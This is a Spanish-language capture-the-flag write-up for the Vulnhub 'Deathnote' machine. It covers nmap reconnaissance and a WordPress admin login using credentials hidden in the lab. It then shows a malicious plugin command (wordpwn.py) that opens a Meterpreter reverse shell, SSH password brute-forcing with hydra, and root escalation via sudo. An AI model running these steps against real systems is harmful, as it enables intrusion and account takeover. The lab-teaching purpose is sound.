---
title: "Deathnote"
excerpt: "[Easy][Vulnhub] Writeup de Deathnote."
header:
  teaser: ""
tags:
  - vulnhub
  - easy
  - writeup
categories:
  - vulnhub
---

[https://www.vulnhub.com/entry/deathnote-1,739/](https://www.vulnhub.com/entry/deathnote-1,739/)


```bash
sudo nmap -vvv -sS -sV -O 192.168.1.0/24
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/1.png){: .align-center}

Saldrá una IP con los puertos 80 y 22 abiertos

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/2.png){: .align-center}

Al intentar entrar a la web saldrá un mensaje que dice Please wait y se redireccionará a una web de wordpress.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/3.png){: .align-center}

Realizar un escaneo de todos los directorios del sitio con gobuster

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/4.png){: .align-center}

Ir a `/robots.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/5.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/6.png){: .align-center}

Ir a `/important.jpg`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/7.png){: .align-center}

Dirá que la imagen no se puede cargar por contener errores así que procedemos a descargar ese archivo a nuestro equipo usando `wget`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/8.png){: .align-center}

Comprobar que el archivo es realmente una imagen en jpg

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/9.png){: .align-center}

Dirá que realmente es un documento de texto al que se le ha cambiado el nombre para hacer parecer que es una imagen.

Leer el archivo `important.jpg`, no es necesario cambiar su extensión para que cat lo reconozca.

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/10.png){: .align-center}

Dirá que miremos en `/user.txt`, tambien que la contraseña puede estar en el lugar de la pista

Entrar a la web y darle click al Hint

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/11.png){: .align-center}

Dirá que busquemos un archivo llamado `notes.txt` en el servidor o leamos el comentario de L

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/12.png){: .align-center}

Mirar el comentario de L

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/13.png){: .align-center}

Probar a acceder desde el login con el usuario Kira y la contraseña iamjustic3

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/14.png){: .align-center}

Dará acceso al panel de administrador de Wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/15.png){: .align-center}

Probar a entrar al editor de temas para modificar el de 404, mostrará que no es posible

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/16.png){: .align-center}

Utilizar `malicious-wordpress-plugin` para crear un plugin que abrirá un shell inverso

```bash
python wordpwn.py 192.168.122.5 4444 Y
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/17.png){: .align-center}

Quedará en el puerto de escucha y se generará un archivo zip que será el plugin

Subir el plugin al sitio de wordpress

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/18.png){: .align-center}
![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/19.png){: .align-center}

Activar el plugin

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/20.png){: .align-center}

Ir al editor de plugins y seleccionar GotEm

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/21.png){: .align-center}

Ir a la ruta del plugin

http://192.168.122.7/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php

Se abrirá un shell inverso con meterpreter

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/22.png){: .align-center}

Entrar en modo shell con el comando `shell`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/21.png){: .align-center}

Comprobar que el usuario es `www-data`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/22.png){: .align-center}

Ir al directorio home y mostrar contenido para ver los usuarios, se mostraran el usuario kira y el usuario l

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/23.png){: .align-center}

Entrar en el directorio de kira, mostrar el contenido e intentar leer el archivo `kira.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/24.png){: .align-center}

Volver atrás e intentar lo mismo en el directorio de `l`, mostrar el contenido de `user.txt`, mostrará un texto cifrado en Brainfuck

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/25.png){: .align-center}

Descifrar el mensaje usando la web de dcode.fr, mostrará el mensaje "i think u got the shell, but you wont be able to kill me -kira"

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/26.png){: .align-center}

Volver al panel de wordpress e investigar más, en la sección de media se encontrará el archivo `notes.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/27.png){: .align-center}

Parece ser un diccionario de posibles claves, descargarlo

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/28.png){: .align-center}

Usar `hydra` para encontrar cuál de las contraseñas es del usuario L en `ssh`

```bash
sudo hydra -t 4 -l l -P Downloads/notes.txt 192.168.122.7 ssh
```

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/29.png){: .align-center}

Usuario: l
Contraseña: death4me

Entrar por `ssh` con el usuario l y la contraseña death4me

Ir al directorio `/opt` y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/30.png){: .align-center}

Ir al directorio y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/31.png){: .align-center}

Ir al directorio `fake-notebook-rule/` y mostrar el contenido, el archivo `hint` dirá que se use cyberchef aunque no es necesario

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/32.png){: .align-center}

Comprobar el tipo de archivo de `case.wav`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/33.png){: .align-center}

Leer el archivo `case.wav`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/34.png){: .align-center}

Usar dcode.fr para descifrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/35.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/36.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/37.png){: .align-center}

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/38.png){: .align-center}

Ir al directorio `kira-case/`, el archivo case-file.txt no mostrará nada relevante

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/39.png){: .align-center}

Cambiar al usuario kira con la contraseña del mensaje cifrado anterior

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/40.png){: .align-center}

Mostrar que permisos tiene el usuario con el comando

```bash
sudo -l
```

Mostrará que puede ejecutar todo, esto significa que puede cambiar a usuario root sin necesidad de introducir contraseña

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/41.png){: .align-center}

Cambiar al usuario root

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/42.png){: .align-center}

Ir al directorio de root y mostrar el contenido

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/43.png){: .align-center}

Leer el contenido de `root.txt`

![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/deathnote/44.png){: .align-center}
